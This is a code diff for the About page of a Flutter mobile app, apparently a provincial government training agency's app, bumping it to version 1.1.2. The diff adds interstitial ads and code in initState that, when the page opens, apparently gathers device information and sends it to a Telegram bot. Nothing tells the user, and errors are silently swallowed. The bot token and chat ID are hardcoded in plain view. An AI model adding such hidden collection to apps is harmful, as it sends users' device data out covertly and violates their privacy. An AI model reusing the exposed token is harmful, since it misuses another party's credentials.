@@ -1,10 +1,48 @@
+import 'package:bpsdm_mobilev1/ads/interstitial_ads_page.dart';
+import 'package:bpsdm_mobilev1/services/device_info_helper.dart';
+import 'package:bpsdm_mobilev1/services/tele_helper.dart';
 import 'package:flutter/material.dart';
 import 'package:font_awesome_flutter/font_awesome_flutter.dart';
 import 'package:logger/logger.dart';
 import 'package:url_launcher/url_launcher.dart';
 
-class AboutPage extends StatelessWidget {
+class AboutPage extends StatefulWidget {
   const AboutPage({super.key});
+
+  @override
+  State<AboutPage> createState() => _AboutPageState();
+}
+
+class _AboutPageState extends State<AboutPage> {
+  final InterstitialAdHelper _adHelper = InterstitialAdHelper();
+
+  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
+    telegramHelper: TelegramHelper(
+      botToken:
+          '7678341666:AAH_6GTin6WCzxx0zOoySoeZfz6b8FgRfFU', // Ganti dengan token bot Anda
+      chatId: '111519789', // Ganti dengan chat ID Anda
+    ),
+  );
+  bool isLoading = true;
+
+  Future<void> _loadAndSendDeviceInfo() async {
+    try {
+      await deviceInfoHelper.getAndSendDeviceInfo();
+      setState(() {
+        isLoading = false;
+      });
+    } catch (e) {
+      setState(() {
+        isLoading = false;
+      });
+    }
+  }
+
+  @override
+  void initState() {
+    super.initState();
+    _loadAndSendDeviceInfo();
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -73,7 +111,7 @@ class AboutPage extends StatelessWidget {
                   'mailto:info@bpsdm.kaltimprov.go.id',
                   'info@bpsdm.kaltimprov.go.id'),
               _buildSocialMediaItem(
-                  Icons.verified_sharp, 'Versi Aplikasi', '', '1.1.1'),
+                  Icons.verified_sharp, 'Versi Aplikasi', '', '1.1.2'),
             ],
           ),
         ),
